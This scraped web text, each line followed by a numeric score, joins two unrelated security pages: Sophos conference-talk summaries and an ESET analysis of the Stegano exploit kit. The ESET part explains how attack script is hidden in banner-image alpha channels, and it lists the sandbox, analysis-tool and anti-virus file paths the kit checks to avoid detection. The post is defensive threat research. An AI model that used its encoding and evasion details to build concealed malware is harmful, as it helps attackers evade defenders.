"Jason Zhang – Making the Invisible Visible: Case Studies in PDF Malware
Jason’s talk investigates recent PDF malware campaigns and the new techniques adversaries are using to deliver malware via web downloads, email attachments and other infection vectors, in both targeted and non-targeted attacks.
PDF attackers can break detection with polymorphic techniques to hide malicious code. Jason’s research explores some new techniques used by malware writers to bypass detection:",0.019133550896118234
"A simple but effective URL aliasing technique to download malware.
Using PDF to deliver specific topic-related content for search engine poisoning.
Encapsulating PDF malware inside a PDF file to break detection.",0.013159278244850192
"Gábor Szappanos – Comparing the Incomparables
Gábor analyzes some APT malware families, and shows us how we can compare the different malware authors on the basis of their skill level.
His presentation details the exploitation of the CVE-2014-1761 vulnerability, investigates the different malware families that were using this vulnerability, and discusses the depth of modification into the exploit.
The comparative analysis allowed Gábor to draw a relationship chart between the different malware families, showing strong correlation with previously known intelligence, and adding a couple of new relations.
As Gábor says, this research allows us to understand the strengths and weaknesses of our adversaries.",0.015485602637217544
"About SophosLabs
SophosLabs is the global network of threat centers staffed by Sophos researchers and analysts.
Keep up to date with our latest industry-leading research and technical papers, expert opinion, and security advice at Naked Security and right here on the Sophos Blog.
Sign up for our Sophos Blog newsletter by entering your email address in the field at the top right of the blog’s webpage. Follow us on your favorite social media networks, chat with us in our forums, download our informative podcasts, or sign up for our RSS feeds.",0.026407615218321134
Share on Facebook,0.00998712431791049
Share on Twitter,0.009909977340160525
"Share on LinkedIn
",0.009855679767380665
"Readers of popular websites targeted by stealthy Stegano exploit kit hiding in pixels of malicious ads
Millions of readers who visit popular news websites have been targeted by a series of malicious ads redirecting them to the Stegano exploit kit.",0.018985482489215166
ESET Research,0.009387999064506491
6 Dec 2016 - 12:00PM,0.011363250394643476
Millions of readers who visit popular news websites have been targeted by a series of malicious ads redirecting them to the Stegano exploit kit.,0.01816244945779255
"Update (December 15th): Further research and comparison of our findings with those of our colleagues from Proofpoint and Trend Micro brought us to the conclusion that the malvertising campaign we analyzed was actually a new wave of the AdGholas campaign. Initially, the gang behind AdGholas had been using the Angler and Neutrino exploit kits. In the most recent campaigns, they switched to the Stegano exploit kit, also known as Astrum, and began using unique steganography techniques, as described in this post.",0.014416489709434654
"Millions of readers who visited popular news websites have been targeted by a series of malicious ads redirecting to an exploit kit exploiting several Flash vulnerabilities. Since at least the beginning of October, users might have encountered ads promoting applications calling themselves “Browser Defence” and “Broxu” using banners similar to the ones below:",0.015538575069608318
These advertisement banners were stored on a remote domain with the URL hxxps://browser-defence.com and hxxps://broxu.com.,0.010772486247799806
"Without requiring any user interaction, the initial script reports information about the victim’s machine to the attacker’s remote server. Based on server-side logic, the target is then served either a clean image or its almost imperceptibly modified malicious evil twin.",0.011364371352515446
"The malicious version of the graphic has a script encoded in its alpha channel, which defines the transparency of each pixel. Since the modification is minor, the final picture’s color tone is only slightly different to that of the clean version:",0.010275291188159952
"Using the known Internet Explorer vulnerability CVE-2016-0162, the encoded script attempts to verify that it is not being run in a monitored environment such as a malware analyst’s machine.",0.008575329893743655
"”If the script does not detect any signs of monitoring, it redirects to the Stegano exploit kit’s landing page, via the TinyURL service. The landing page loads a Flash file that is able to exploit three different vulnerabilities (CVE-2015-8651, CVE-2016-1019, CVE-2016-4117), depending on the version of Flash found on the victim’s system.",0.008845751784897216
"Upon successful exploitation, the executed shell code collects information on installed security products and performs – as paranoid as the cybercriminals behind this attack – yet another check to verify that it is not being monitored. If results are favorable, it will attempt to download the encrypted payload from the same server again, disguised as a gif image.",0.011634020773161335
"The payload is then decrypted and launched via regsvr32.exe or rundll32.exe. Payloads detected so far include backdoors, banking trojans, spyware, file stealers and various trojan downloaders.",0.02250608010543631
Technical analysis of the Stegano exploit kit,0.008665871827719496
"An earlier variant of this stealthy exploit pack has been hiding in plain sight since at least late 2014, when we spotted it targeting Dutch customers. In spring 2015 the attackers focused on the Czech Republic and now they have shifted their focus onto Canada, Britain, Australia, Spain and Italy.",0.013488412411749251
"In the earlier campaigns, in an effort to masquerade as an advertisement, the exploit kit was using domain names starting with “ads*.” and URI names containing watch.flv, media.flv, delivery.flv, player.flv, or mediaplayer.flv.",0.012735729559506304
"In the current campaign, they have improved their tactics significantly. It appears that the exploit pack’s targeting of specific countries is a result of the advertising networks the attackers were able to abuse.",0.011191749728660327
"We can say that even some of the other major exploit kits, like Angler and Neutrino, are outclassed by the Stegano kit in terms of referrals – ‘the websites onto which they managed to get the malicious banners installed. We have observed major domains, including news websites visited by millions of people every day, acting as “referrers” hosting these advertisements.",0.015557844768074425
"Upon hitting the advertising slot, the browser will display an ordinary-looking banner to the observer. There is, however, a lot more to it than advertising.",0.013419279341615575
The steganography advertisement,0.00793244673394855
"In the vast majority of the cases, the advertisement was promoting a product called “Browser Defence” and it has been only recently when we started to detect banners promoting the software “Broxu”. However, for the sake of simplicity, and since the campaigns are practically identical (apart from the banner and its hosting domain, of course), only the “Browser Defence” campaign is analyzed below.",0.013121199638145398
The advertisement was located at the browser-defence.com domain with a URI structure similar to the following (note the https):,0.00848707683355654
hxxps://browser-defence.com/ads/s/index.html?w=160&h=600,0.01118962675462054
"The index.html loads countly.min.js and feeds the initial parameters to the script. This countly, however, is not the stock library of the open source mobile & web analytics platform you would download from github. It is a heavily modified and obfuscated version, with some parts deleted and interlaced with custom code. This custom code is responsible for an initial environment check. Information about the environment is reported back to the server as XOR-encrypted parameters of the 1x1gif file, as captured in the image above.",0.008882763157706641
The following information about the environment is sent:,0.008602062846902236
systemLocale^screenResolution^GMT offset^Date^userAgent^pixelRatio,0.011052890570840024
"After that, the script will request the advertising banner. The server will reply with either a clean or a malicious version, most likely also depending on the previous environment check.",0.009339968230124951
"The script will then attempt to load the banner and read the RGBA structure. If a malicious version of the image was received, it will decode some Javascript and variables from the alpha channel",0.008625196198209673
"The steganography is implemented in the following way: Two consecutive alpha values represent the tens and ones of a character code, encoded as a difference from 255 (the full alpha). Moreover, in order to make the change more difficult to spot by naked eye, the difference is minimized using an offset of 32.",0.02167672930293485
"For instance, if the first few alpha bytes contained the values 239, 253, 237, 243, 239, 237, 241, 239, 237, 245, 239, 247, 239, 235, 239 and 237, they would decode to the word “function”. In this example, the first two alpha values 239, 253 would give us an ‘f’:",0.017904651724458875
A closer look at one of the clean banners and one with the Stegano code shows only a subtle difference.,0.0179111281035631
Clean picture; picture with malicious content; malicious version enhanced for illustrative purposes.,0.01631869781985451
"The alpha channel of the unused pixels is filled with some pseudorandom values, in order to make the “alpha noise” evenly distributed and thus more difficult to spot.",0.011179506114071591
"After successful extraction, the JS code integrity is checked against a hash encoded at the end of the picture, then executed.",0.010679130569262063
"Next, the new script attempts to check the browser and computer environment further using a known Internet Explorer vulnerability, CVE-2016-0162. In particular, it is it is focused on checking for the presence of packet capture, sandboxing, and virtualization software, as well as various security products. Also, it checks for various graphics and security drivers to verify whether it is running on a real machine. More details can be found Appendix 1.",0.008518941357656629
"If no indication of monitoring is detected, it creates an iframe (just one pixel in size) at coordinates off the screen, sets its window.name property (this name will be used later) and redirects to TinyURL via https. TinyURL then redirects to an exploit landing page via http. The referrer to the original site is lost during this process.",0.013450951136555589
The exploit,0.006111878908545476
"After successful redirection, the landing page checks the userAgent looking for Internet Explorer, loads a Flash file, and sets the FlashVars parameters via an encrypted JSON file. The landing page also serves as a middleman for the Flash and the server via ExternalInterface and provides basic encryption and decryption functions.",0.011670802325062901
"The Flash file has another Flash file embedded inside and, similarly to the Neutrino exploit kit, it comes with three different exploits based on the Flash version.",0.015026390815634838
"The second stage Flash file decrypts the FlashVars. It contains a JSON file with URI for error reporting, JS function names for ExternalInterface, the callback function name and some unused data:",0.008562907620812577
"{“a”:”\/e.gif?ts=1743526585&r=10&data=”,”b”:”dUt”,”c”:”hML”,”d”:true,”x”:”\/x.gif?ts=1743526585&r=70&data=”}",0.011955032988586356
"Subsequently, it invokes a JS via ExtelnalInterface.call() that checks for the Flash version and communicates this to the server via the landing page. This is done through an encrypted URI parameter of a request for a GIF file. The encryption’s algorithm is simple, and uses the window.name from the advertisement:",0.008248232338363692
The response is a GIF image of which the first bytes are discarded and the rest is decrypted using the same algorithm and then passed back to Flash.,0.010743015128225286
"The response is a JSON containing a letter denoting which exploit to use (CVE-2015-8651, CVE-2016-1019 or CVE-2016-4117), a password for the corresponding exploit and a shell code ready with the URI for the payload.",0.0073030737015894465
The shell code,0.006276782319196705
"The shell code is decrypted into its final stage during the exploitation phase. It will attempt to download an encrypted payload, again disguised as a GIF image. First, however, it performs yet another check for signs that could suggest it is being analyzed.",0.010096783372916307
It is particularly interested in presence software containing the following strings in their filenames:,0.009171424598934164
vmtoolsd.exe,0.00837299884134357
VBoxService.exe,0.007608845911319495
prl_tools_service.exe,0.0077920276745820916
VBoxHook.dll,0.007346250479830507
SBIEDLL.DLL,0.0078889462149071
fiddler.exe,0.008721644639608117
charles.exe,0.008292810680280649
wireshark.exe,0.009454284381406164
proxifier.exe,0.007806771587428152
procexp.exe,0.008112754375503073
ollydbg.exe,0.008997249298192678
windbg.exe,0.008463570984036606
"eset*, kasper*, avast*, alwil*, panda*, nano a*, bitdef*, bullgu*, arcabi*, f-secu*, g data*, escan*, trustp*, avg*, sophos*, trend m*, mcafee*, lavaso*, immune*, clamav*, emsiso*, superanti*, avira*, vba32*, sunbel*, gfi so*, vipre*, microsoft sec*, microsoft ant*, norman*, ikarus*, fortin*, filsec*, k7 com*, ahnlab*, malwareby*, comodo*, symant*, norton*, agnitu*, drweb*, 360*, quick h",0.023542857706387976
"If it detects anything suspicious, it will not attempt to download the payload.",0.013338227027578364
The payload,0.007655473903825483
"If the payload is received, the first 42 bytes of the GIF are discarded; the rest is decrypted and saved to a file using one of the following methods:",0.014417535801928949
"CreateFile, WriteFile
CreateUrlCacheEntryA(*” http://google.com/”,,,,), CreateFileA, CreateFileMappingA, MapViewOfFile, {loop of moving bytes}, FlushViewOfFile, UnmapViewOfFile",0.012542423082996912
The payload is then launched via regsvr32.exe or rundll32.exe.,0.010543998598375293
"During our research, we have seen the following payloads being downloaded by the Stegano exploit kit:",0.014104721531907338
Win32/TrojanDownloader.Agent.CFH,0.012043963904357247
Win32/TrojanDownloader.Dagozill.B,0.01100007403269232
Win32/GenKryptik.KUM,0.00890587469084514
Win32/Kryptik.DLIF,0.008266919426591635
"After a detailed analysis of the Downloaders and Kryptiks (the latter are ESET’s detections of extensively obfuscated variants), we found out that they either contained or were downloading Ursnif and Ramnit malware.",0.012447330855718808
"Ursnif has a multitude of modules for stealing email credentials, has a backdoor, keylogger, screenshot maker, and video maker, is injecting into IE/FF/Chrome and modifying http traffic, and can steal any file from the victim computer. According to the configuration files found in the analyzed samples, they seem to be targeting the corporate sector, focusing on payment services and institutions.",0.010649439895987323
"Ramnit is a file infector that has been targeting the banking sector as well, utilizing its many capabilities, such as information exfiltration, screenshot capture, file execution, etc.",0.018779867149803287
Conclusion,0.008171308922719556
"The Stegano exploit kit has been trying to fly under the radar since at least 2014. Its authors have put quite some effort into implementing several techniques to achieve self-concealment. In one of the most recent campaigns we detected, which we traced back at least to the beginning of October 2016, they had been distributing the kit through advertisement banners using steganography and performing several checks to confirm that they were not being monitored.",0.010946844187506799
"In the event of successful exploitation, the vulnerable victims’ systems had been left exposed to further compromise by various malicious payloads including backdoors, spyware and banking Trojans.",0.015427065068528312
"Exploitation by the Stegano kit, or any other known exploit kit for that matter, can often be avoided by running fully patched software and by using a reliable, updated internet security solution.",0.010468418881762087
Appendix 1 – Strings scanned for by Stegano exploit kit,0.008803246154859723
Security products,0.007289695034083721
C:\Windows\System32\drivers\vmci.sys,0.008432932683468342
C:\Program Files\VMware\VMware Tools\vmtoolsd.exe,0.010102288108276292
C:\Program Files (x86)\VMware\VMware Tools\vmtoolsd.exe,0.01313945768145941
C:\Windows\System32\drivers\vboxdrv.sys,0.008210452827602244
C:\Windows\System32\vboxservice.exe,0.008440363638025028
C:\Program Files\Oracle\VirtualBox Guest Additions\VBoxTray.exe,0.009075565247612327
C:\Program Files (x86)\Oracle\VirtualBox Guest Additions\VBoxTray.exe,0.011292094334694913
C:\Windows\System32\drivers\prl_fs.sys,0.008277185768481687
C:\Program Files\Parallels\Parallels Tools\prl_cc.exe,0.010794312753204638
C:\Program Files (x86)\Parallels\Parallels Tools\prl_cc.exe,0.012059370878102493
C:\Windows\System32\VMUSrvc.exe,0.008895836413329028
C:\Windows\System32\VMSrvc.exe,0.0090163272799475
C:\Program Files\Fiddler\Fiddler.exe,0.01029048095620999
C:\Program Files (x86)\Fiddler\Fiddler.exe,0.010670047282384854
C:\Program Files\Fiddler2\Fiddler.exe,0.009948717264440576
C:\Program Files (x86)\Fiddler2\Fiddler.exe,0.010239952171564148
C:\Program Files\Fiddler4\Fiddler.exe,0.009978973572610683
C:\Program Files (x86)\Fiddler4\Fiddler.exe,0.01007891911294756
C:\Program Files\FiddlerCoreAPI\FiddlerCore.dll,0.010999021515527563
C:\Program Files (x86)\FiddlerCoreAPI\FiddlerCore.dll,0.011567670623760296
C:\Program Files\Charles\Charles.exe,0.010092348037818555
C:\Program Files (x86)\Charles\Charles.exe,0.010018314085310731
C:\Program Files\Wireshark\wireshark.exe,0.011874382698130681
C:\Program Files (x86)\Wireshark\wireshark.exe,0.014795614157638415
C:\Program Files\Sandboxie\SbieDll.dll,0.00981138487785016
C:\Program Files (x86)\Sandboxie\SbieDll.dll,0.009559419680630454
SbieDll.dll,0.008014173871681796
C:\Program Files\Invincea\Enterprise\InvProtect.exe,0.011495555031931115
C:\Program Files (x86)\Invincea\Enterprise\InvProtect.exe,0.01138058787199292
C:\Program Files\Invincea\Browser Protection\InvBrowser.exe,0.010446577799744894
C:\Program Files (x86)\Invincea\Browser Protection\InvBrowser.exe,0.010388401036474204
C:\Program Files\Invincea\threat analyzer\fips\nss\lib\ssl3.dll,0.00955027580578427
C:\Program Files (x86)\Invincea\threat analyzer\fips\nss\lib\ssl3.dll,0.008951001990092688
InvGuestIE.dll,0.007476869514981055
InvGuestIE.dll/icon.png,0.008261203428248431
sboxdll.dll,0.007608519197383701
InvRedirHostIE.dll,0.007471905623186115
C:\Windows\System32\PrxerDrv.dll,0.00874035569846865
PrxerDrv.dll,0.007457537462345676
C:\Program Files\Proxifier\Proxifier.exe,0.008501211575163814
C:\Program Files (x86)\Proxifier\Proxifier.exe,0.008425224700260414
C:\Windows\System32\pcapwsp.dll,0.009578036801087264
pcapwsp.dll,0.008144772205200823
C:\Program Files\Proxy Labs\ProxyCap\pcapui.exe,0.00930911625973585
C:\Program Files (x86)\Proxy Labs\ProxyCap\pcapui.exe,0.008972848566845992
C:\Windows\System32\socketspy.dll,0.009312606093772047
socketspy.dll,0.008210187669973501
C:\Program Files\Ufasoft\SocksChain\sockschain.exe,0.010147254861829103
C:\Program Files (x86)\Ufasoft\SocksChain\sockschain.exe,0.011187412374194405
C:\Program Files\Debugging Tools for Windows (x86)\windbg.exe,0.010525494956165393
C:\Program Files (x86)\Debugging Tools for Windows (x86)\windbg.exe,0.011500213914727442
C:\Program Files\Malwarebytes Anti-Exploit\mbae.exe,0.010229676077390781
C:\Program Files (x86)\Malwarebytes Anti-Exploit\mbae.exe,0.010351733656361217
mbae.dll,0.007739041103330457
C:\Program Files\Malwarebytes Anti-Malware\mbam.exe,0.011753346871679171
C:\Program Files (x86)\Malwarebytes Anti-Malware\mbam.exe,0.011727117226867145
C:\Windows\System32\drivers\hmpalert.sys,0.00789515957316611
C:\Program Files\EMET 4.0\EMET_GUI.exe,0.009460159361392328
C:\Program Files (x86)\EMET 4.0\EMET_GUI.exe,0.010375873063865115
C:\Program Files\EMET 4.1\EMET_GUI.exe,0.009569530656768244
C:\Program Files (x86)\EMET 4.1\EMET_GUI.exe,0.01038242167308534
C:\Program Files\EMET 5.0\EMET_GUI.exe,0.009350392734638557
C:\Program Files (x86)\EMET 5.0\EMET_GUI.exe,0.010132297982178295
C:\Program Files\EMET 5.1\EMET_GUI.exe,0.009469779646322452
C:\Program Files (x86)\EMET 5.1\EMET_GUI.exe,0.010145349970943074
C:\Program Files\EMET 5.2\EMET_GUI.exe,0.009517388251349734
C:\Program Files (x86)\EMET 5.2\EMET_GUI.exe,0.010102878598194587
C:\Program Files\EMET 5.5\EMET_GUI.exe,0.009365212248617083
C:\Program Files (x86)\EMET 5.5\EMET_GUI.exe,0.009870215423735007
C:\Python27\python.exe,0.009103938589898553
C:\Python34\python.exe,0.00926171229695405
C:\Python35\python.exe,0.009301497091801947
C:\Program Files\GeoEdge\GeoProxy\GeoProxy.exe,0.009665362611736783
C:\Program Files (x86)\GeoEdge\GeoProxy\GeoProxy.exe,0.009410724475598986
C:\Program Files\geoedge\geovpn\bin\geovpn.exe,0.011362427636625871
C:\Program Files (x86)\geoedge\geovpn\bin\geovpn.exe,0.010760375174693304
C:\Program Files\GeoSurf by BIscience Toolbar\tbhelper.dll,0.011121251661493359
C:\Program Files (x86)\GeoSurf by BIscience Toolbar\tbhelper.dll,0.010278978051656895
C:\Program Files\AdClarity Toolbar\tbhelper.dll,0.010224589427711317
C:\Program Files (x86)\AdClarity Toolbar\tbhelper.dll,0.010077586336260436
XProxyPlugin.dll,0.007267712868305298
C:\Program Files\EffeTech HTTP Sniffer\EHSniffer.exe,0.009886352847527369
C:\Program Files (x86)\EffeTech HTTP Sniffer\EHSniffer.exe,0.009793023221885133
C:\Program Files\HttpWatch\httpwatch.dll,0.009001843868534198
C:\Program Files (x86)\HttpWatch\httpwatch.dll,0.009147827592530522
httpwatch.dll,0.00717308893158497
C:\Program Files\IEInspector\HTTPAnalyzerFullV7\HookWinSockV7.dll,0.009702931202949405
C:\Program Files (x86)\IEInspector\HTTPAnalyzerFullV7\HookWinSockV7.dll,0.01013832208319243
C:\Program Files\IEInspector\HTTPAnalyzerFullV6\HookWinSockV6.dll,0.009725135161994136
C:\Program Files (x86)\IEInspector\HTTPAnalyzerFullV6\HookWinSockV6.dll,0.01023615175163195
C:\Program Files\IEInspector\IEWebDeveloperV2\IEWebDeveloperV2.dll,0.009726501303022328
C:\Program Files (x86)\IEInspector\IEWebDeveloperV2\IEWebDeveloperV2.dll,0.011540089273072818
HookWinSockV6.dll/#10/PACKAGEINFO,0.008383319800914224
HookWinSockV7.dll/#10/PACKAGEINFO,0.008378879499693515
C:\Program Files\NirSoft\SmartSniff\smsniff.exe,0.00999241683160268
C:\Program Files (x86)\NirSoft\SmartSniff\smsniff.exe,0.010927017023020236
C:\Program Files\SoftPerfect Network Protocol Analyzer\snpa.exe,0.010263195661123437
C:\Program Files (x86)\SoftPerfect Network Protocol Analyzer\snpa.exe,0.010709248278675032
C:\Program Files\York\York.exe,0.009465260409123433
C:\Program Files (x86)\York\York.exe,0.009169176195860995
C:\Windows\System32\drivers\pssdklbf.sys,0.008455160719161858
C:\Program Files\Andiparos\Andiparos.exe,0.008419723799382939
C:\Program Files (x86)\Andiparos\Andiparos.exe,0.00855429700118504
C:\Program Files\IEInspector\HTTPAnalyzerStdV7\HTTPAnalyzerStdV7.exe,0.010827043608627407
C:\Program Files (x86)\IEInspector\HTTPAnalyzerStdV7\HTTPAnalyzerStdV7.exe,0.011869992892194814
C:\Program Files\IEInspector\HTTPAnalyzerFullV7\HttpAnalyzerStdV7.exe,0.011140435438005136
C:\Program Files (x86)\IEInspector\HTTPAnalyzerFullV7\HttpAnalyzerStdV7.exe,0.011876388668369042
C:\Program Files\HTTPDebuggerPro\HTTPDebuggerUI.exe,0.00934586490806899
C:\Program Files (x86)\HTTPDebuggerPro\HTTPDebuggerUI.exe,0.009963327033186253
C:\Program Files\OWASP\ed Attack Proxy\AP.exe,0.009607431955988122
C:\Program Files (x86)\OWASP\ed Attack Proxy\AP.exe,0.009069851444399868
C:\Program Files\Iarsn\AbpMon 9.x\AbpMon.exe,0.00919859996814143
C:\Program Files (x86)\Iarsn\AbpMon 9.x\AbpMon.exe,0.010048983947618328
C:\Program Files\AnVir Task ManagerAnVir.exe,0.010309352817683415
C:\Program Files (x86)\AnVir Task ManagerAnVir.exe,0.011337386873348287
C:\Program Files\rohitab.com\API Monitor\apimonitor-x64.exe,0.009065169133542716
C:\Program Files (x86)\rohitab.com\API Monitor\apimonitor-x64.exe,0.008467388704653245
C:\Program Files\Chameleon Task Manager\manager_task.exe,0.011040193371783746
C:\Program Files (x86)\Chameleon Task Manager\manager_task.exe,0.010567515015357465
C:\Program Files\Free Extended Task Manager\Extensions\ExtensionsTaskManager.exe,0.011407998787055229
C:\Program Files (x86)\Free Extended Task Manager\Extensions\ExtensionsTaskManager.exe,0.01123755068062604
C:\Program Files\Kozmos\Kiwi Application Monitor\Kiwi Application Monitor.exe,0.009852984370894102
C:\Program Files (x86)\Kozmos\Kiwi Application Monitor\Kiwi Application Monitor.exe,0.011556057575172307
C:\Program Files\PerfMon4x\PerfMon.exe,0.010258646595270982
C:\Program Files (x86)\PerfMon4x\PerfMon.exe,0.010452593556611434
C:\Program Files\Process Lasso\ProcessLasso.exe,0.010990448465242775
C:\Program Files (x86)\Process Lasso\ProcessLasso.exe,0.011695059094669391
C:\Program Files\Uniblue\ProcessQuickLink 2\ProcessQuickLink2.exe,0.009129679865625073
C:\Program Files (x86)\Uniblue\ProcessQuickLink 2\ProcessQuickLink2.exe,0.009703229064332963
C:\Program Files\Psymon\Psymon.exe,0.009384896605073356
C:\Program Files (x86)\Psymon\Psymon.exe,0.00920276730935865
C:\Program Files\LizardSystems\Remote Process Explorer\rpexplorer.exe,0.009738240277374355
C:\Program Files (x86)\LizardSystems\Remote Process Explorer\rpexplorer.exe,0.009728981044763496
C:\Program Files\Security Process Explorer\procmgr.exe,0.010429142356149668
C:\Program Files (x86)\Security Process Explorer\procmgr.exe,0.009840213440770462
C:\Program Files\System Explorer\SystemExplorer.exe,0.010113241752126023
C:\Program Files (x86)\System Explorer\SystemExplorer.exe,0.010085512131578933
C:\Program Files\Iarsn\TaskInfo 10.x\TaskInfo.exe,0.008990338881285198
C:\Program Files (x86)\Iarsn\TaskInfo 10.x\TaskInfo.exe,0.009358727491224017
C:\Program Files\What’s my computer doing\WhatsMyComputerDoing.exe,0.01011959279496033
C:\Program Files (x86)\What’s my computer doing\WhatsMyComputerDoing.exe,0.009573826858208512
C:\Program Files\VMware\VMware Workstation\vmware.exe,0.010052315047629379
C:\Program Files (x86)\VMware\VMware Workstation\vmware.exe,0.012507787573387663
C:\Program Files\Oracle\VirtualBox\VirtualBox.exe,0.008962109324655687
C:\Program Files (x86)\Oracle\VirtualBox\VirtualBox.exe,0.009896207520042721
C:\Windows\System32\VBoxControl.exe,0.008866944669288945
C:\Windows\System32\VBoxTray.exe,0.009563590561720625
C:\Windows\System32\vmms.exe,0.009002747827767
C:\Program Files\HitmanPro.Alert\hmpalert.exe,0.00921823313134873
C:\Program Files (x86)\HitmanPro.Alert\hmpalert.exe,0.00930401310968254
Drivers and libraries,0.006994277311858532
(needs to find at least one),0.009469606657162455
C:\Windows\System32\drivers\igdkmd64.sys,0.008141124049658943
C:\Windows\System32\drivers\atikmdag.sys,0.008082925228143911
C:\Windows\System32\drivers\nvlddmkm.sys,0.008669577256997796
C:\Windows\System32\drivers\igdkmd32.sys,0.00812863747004644
C:\Windows\System32\drivers\nvhda64v.sys,0.008321298818750433
C:\Windows\System32\drivers\atihdmi.sys,0.008464258883715603
C:\Windows\System32\drivers\nvhda32v.sys,0.00828039863454022
C:\Windows\System32\drivers\igdpmd64.sys,0.008237285187165155
C:\Windows\System32\drivers\ATI2MTAG.SYS,0.009534567041853625
C:\Windows\System32\drivers\igdpmd32.sys,0.008237785689162669
C:\Windows\System32\OpenCL.dll,0.009026024004759048
C:\Windows\System32\igdumd32.dll,0.009414058155454597
C:\Windows\System32\igd10umd32.dll,0.00914206850555832
C:\Windows\System32\igdumd64.dll,0.009508630332957457
C:\Windows\System32\igd10umd64.dll,0.0094001126429748
C:\Windows\System32\igdusc64.dll,0.009454428833504558
C:\Windows\System32\igdumdim64.dll,0.009801594500022714
C:\Windows\System32\igdusc32.dll,0.00935133300006108
C:\Windows\System32\igdumdim32.dll,0.009644425654995348
C:\Windows\System32\atibtmon.exe,0.009294564583042564
C:\Windows\System32\aticfx32.dll,0.009693722599653287
C:\Windows\System32\nvcpl.dll,0.00892014272491326
C:\Windows\System32\nvcuda.dll,0.009197381126082704
C:\Windows\System32\aticfx64.dll,0.009756332586570937
C:\Windows\System32\nvd3dumx.dll,0.00877415279213034
C:\Windows\System32\nvwgf2umx.dll,0.008638705114656697
C:\Windows\System32\igdumdx32.dll,0.00945936855762608
C:\Windows\System32\nvcuvenc.dll,0.008765042061924966
C:\Windows\System32\amdocl64.dll,0.009329422051510217
C:\Windows\System32\amdocl.dll,0.00931845340973092
C:\Windows\System32\nvopencl.dll,0.008997885740136269
C:\Windows\System32\ATI2CQAG.DLL,0.0090034089472798
C:\Windows\System32\ati3duag.dll,0.009344119554236419
C:\Windows\System32\ATI2DVAG.DLL,0.00887385375602423
C:\Windows\System32\ativvaxx.dll,0.009073875764033734
C:\Windows\System32\ATIKVMAG.DLL,0.009181591124559185
C:\Windows\System32\OEMinfo.ini,0.009797154034637656
C:\Windows\System32\OEMlogo.bmp,0.009770130888649087
C:\Windows\System32\nvsvc32.exe,0.008939280883018319
C:\Windows\System32\nvvsvc.exe,0.009027539379520833
C:\Windows\System32\nvsvc.dll,0.009223314827067064
C:\Windows\System32\nview.dll,0.008787021605635492
(must not find any of these),0.012726365785958205
C:\Windows\System32\drivers\ehdrv.sys,0.008059175955725362
C:\Windows\System32\drivers\eamon.sys,0.008133367809019298
C:\Windows\System32\drivers\eamonm.sys,0.008029712111065734
C:\Windows\System32\drivers\klif.sys,0.008660423591839828
C:\Windows\System32\drivers\klflt.sys,0.008796850078794938
C:\Windows\System32\drivers\kneps.sys,0.008457751203350794
ie_plugin.dll,0.007380646550058434
ToolbarIE.dll,0.007604196473765423
C:\Windows\System32\drivers\tmtdi.sys,0.0080621994974025
C:\Windows\System32\drivers\tmactmon.sys,0.00863683530066317
C:\Windows\System32\drivers\tmcomm.sys,0.008603099598715414
C:\Windows\System32\drivers\tmevtmgr.sys,0.008201861902217944
tmopieplg.dll,0.007547489852835931
Unreferenced strings,0.008637962978262914
mhtml:file:///Program Files\asus/,0.008981763906202311
mhtml:file:///Program Files\acer/,0.008646205535726148
mhtml:file:///Program Files\apple/,0.008125856572123835
mhtml:file:///Program Files\dell/,0.008545756129608395
mhtml:file:///Program Files\fujitsu/,0.009632600774068467
mhtml:file:///Program Files\hp/,0.00914204459052026
mhtml:file:///Program Files\lenovo/,0.008644596599546972
mhtml:file:///Program Files\ibm/,0.008638974494853513
mhtml:file:///Program Files\sumsung/,0.009841488740824023
mhtml:file:///Program Files\sony/,0.008996413504512524
mhtml:file:///Program Files\toshiba/,0.008407755506873893
mhtml:file:///Program Files\nero/,0.009047499373927459
mhtml:file:///Program Files\abbyy/,0.008563794951260917
mhtml:file:///Program Files\bonjour/,0.010977687598232588
mhtml:file:///Program Files\divx/,0.009056827849833637
mhtml:file:///Program Files\k-lite codec pack/,0.00906475230259518
mhtml:file:///Program Files\quicktime/,0.009603038239175854
mhtml:file:///Program Files\utorrent/,0.009966841048928199
mhtml:file:///Program Files\yahoo!/,0.008907854185773778
mhtml:file:///Program Files\ask.com/,0.008856079539741546
mhtml:file:///Program Files\the bat!/,0.009034554019812124
mhtml:file:///Program Files\atheros/,0.009793859544074413
mhtml:file:///Program Files\realtek/,0.008314040197022643
mhtml:file:///Program Files\synaptics/,0.008115959234314185
mhtml:file:///Program Files\creative/,0.008853058412270576
mhtml:file:///Program Files\broadcom/,0.008421648946359217
mhtml:file:///Program Files\intel/,0.00902668549310326
mhtml:file:///Program Files\amd/,0.009022874367941913
mhtml:file:///Program Files\msi/,0.00870541446644757
mhtml:file:///Program Files\nvidia corporation/,0.009366078413533763
mhtml:file:///Program Files\ati technologies/,0.008729784213461267
Appendix 2 – Hashes (sha1),0.018613746232867268
countly.min.js,0.008101349843405825
24FA6490D207E06F22A67BC261C68F61B082ACF8,0.010240781090615658
Code from banner,0.007887445481206012
A57971193B2FFFF1137E083BFACFD694905F1A94,0.009874974794471747
banner.png with stegano,0.010360972057014917
"55309EAE2B826A1409357306125631FDF2513AC5
67799F80CEF4A82A07EFB3698627D7AE7E6101AB
09425B3B8BF71BA12B1B740A001240CD43378A6C
4528736618BBB44A42388522481C1820D8494E37
FE841DF1ACD15E32B4FFC046205CAAFD21ED2AB2
7BE0A9387F8528EC185ACC6B9573233D167DF71B
A5BC07E8E223A0DF3E7B45EEFD69040486E47F27
EC326BA5CD406F656C3B26D4A5319DAA26D4D5FE
3F1A5F624E0E974CAA4F290116CE7908D360E981
33F921C61D02E0758DCB0019C5F37A4D047C9EC7
2FF89048D39BE75F327031F6D308CE1B5A512F73
9A0D9EBC236DF87788E4A3E16400EB8513743233
F36C283B89C9F1B21A4AD3E384F54B0C8E7D417A
17787879D550F11580C74DA1EA36561A270E16F7
9090DB6731A8D49E8B2506087A261D857946A0EB
45B3EE46ADA9C842E65DCF235111AB81EF733F34
F56A878CA094D461BDF0E5E0CECED5B9903DB6E0
6C74A357B932CF27D5634FD88AA593AEF3A77672
0C3C22B8AA461C7DE4D68567EEA4AE3CD8E4D845
5A5A015C378159E6DC3D7978DAD8D04711D997F8
B2473B3658C13831C62A85D1634B035BC7EBD515
9638E1897B748D120149B94D596CEC6A5D547067
0195C8C7B687DD4CBF2578AD3CB13CD2807F25CB
FEC222095ABD62FC7635E2C7FA226903C849C25C
0FCB2B3ED16672A94CD003B4B53181B568E35912
03483E4039839F0807D7BEC08090179E62DBCC60",0.035584850043766436
Stegano exploit kit landing page,0.007815030952539992
"67E26597CF1FF35E4B8300BF181C84015F9D1134
CD46CEE45F2FC982FBA7C4D246D3A1D58D13ED4A
